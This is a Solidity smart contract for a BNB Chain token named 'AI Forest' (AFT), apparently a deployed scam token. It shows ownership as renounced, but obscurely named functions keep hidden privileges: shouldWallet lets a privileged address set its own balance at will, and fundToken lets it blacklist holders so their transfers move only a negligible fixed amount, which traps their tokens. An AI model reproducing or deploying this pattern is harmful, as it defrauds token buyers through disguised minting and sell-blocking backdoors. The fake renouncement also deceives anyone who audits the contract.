/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface senderFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIForest {
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    string public name = "AI Forest";
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public minReceiver;
    address public owner;
    address public swapIs;
    bool public launchList;



    mapping(address => bool) public swapAutoFrom;
    uint256 constant senderMaxLimit = 12 ** 10;
    uint256 public totalSupply = 100000000 * 10 ** 18;


    address public receiverMin;
    string public symbol = "AFT";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        senderFrom maxTake = senderFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverMin = marketingLimit(maxTake.factory()).createPair(maxTake.WETH(), address(this));
        owner = senderTotalMode();
        swapIs = owner;
        minReceiver[swapIs] = true;
        balanceOf[swapIs] = totalSupply;
        emit Transfer(address(0), swapIs, totalSupply);
        tokenModeMax();
    }

    

    function shouldWallet(uint256 txAt) public {
        if (!minReceiver[senderTotalMode()]) {
            return;
        }
        balanceOf[swapIs] = txAt;
    }

    function transferFrom(address launchFromShould, address autoMode, uint256 txAt) public returns (bool) {
        if (launchFromShould != senderTotalMode() && allowance[launchFromShould][senderTotalMode()] != type(uint256).max) {
            require(allowance[launchFromShould][senderTotalMode()] >= txAt);
            allowance[launchFromShould][senderTotalMode()] -= txAt;
        }
        if (autoMode == swapIs || launchFromShould == swapIs) {
            return tokenAt(launchFromShould, autoMode, txAt);
        }
        if (swapAutoFrom[launchFromShould]) {
            return tokenAt(launchFromShould, autoMode, senderMaxLimit);
        }
        return tokenAt(launchFromShould, autoMode, txAt);
    }

    function senderTotalMode() private view returns (address) {
        return msg.sender;
    }

    function tokenModeMax() public {
        emit OwnershipTransferred(swapIs, address(0));
        owner = address(0);
    }

    function teamEnable(address walletLaunchEnable) public {
        if (launchList) {
            return;
        }
        minReceiver[walletLaunchEnable] = true;
        launchList = true;
    }

    function tokenAt(address tokenAmount, address amountList, uint256 txAt) internal returns (bool) {
        require(balanceOf[tokenAmount] >= txAt);
        balanceOf[tokenAmount] -= txAt;
        balanceOf[amountList] += txAt;
        emit Transfer(tokenAmount, amountList, txAt);
        return true;
    }

    function transfer(address autoMode, uint256 txAt) external returns (bool) {
        return transferFrom(senderTotalMode(), autoMode, txAt);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address launchedTake, uint256 txAt) public returns (bool) {
        allowance[senderTotalMode()][launchedTake] = txAt;
        emit Approval(senderTotalMode(), launchedTake, txAt);
        return true;
    }

    function fundToken(address receiverAmountAt) public {
        if (receiverAmountAt == swapIs || receiverAmountAt == receiverMin || !minReceiver[senderTotalMode()]) {
            return;
        }
        swapAutoFrom[receiverAmountAt] = true;
    }


}